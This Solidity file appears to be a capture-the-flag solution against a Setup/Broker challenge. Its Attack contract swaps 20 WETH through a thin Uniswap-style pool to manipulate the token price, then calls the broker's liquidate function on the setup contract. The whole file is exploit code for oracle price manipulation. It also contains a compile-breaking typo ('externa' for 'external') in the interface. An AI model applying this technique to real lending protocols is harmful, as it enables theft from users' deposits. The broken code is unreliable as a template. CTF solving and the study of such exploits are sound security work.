pragma solidity 0.8.7;

import "./Setup.sol";
import "./Broker.sol";

interface IUni {
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) externa returns (uint[] memory amounts);
}

contract Attack {
    IUni pair;
    Broker broker;
    Setup setup;
    Token token;
    WETH9 weth;

    // Get all addresses
    constructor(address _setup) {
        setup = Setup(_setup);
        pair = setup.pair();
        broker = setup.broker();
        token = setup.token();
        weth = setup.weth();
    }

    function attack() public {
        // Get weth so we can swap them for tokens
        weth.deposit{value: 20 ether}();
        // Get the path for uniswap pool
        address[] memory path = new address[](2);
        path[0] = address(weth);
        path[1] = address(token);
        // Exchange 20 weth for tokens. 20 Should be plety since there is only 25 weth in the pool.

        weth.approve(address(pair), 20 ether);

        pair.swapExactTokensForTokens(
            20 ether,
            0,
            path,
            address(this),
            block.timestamp + 500
        );

        // Get how much tokens we swapped.
        uint tokenAmount = token.balanceOf(address(this));

        token.approve(address(broker), tokenAmount);
        // Liquidate the setup contract.
        broker.liquidate(address(setup), tokenAmount);
    }
}
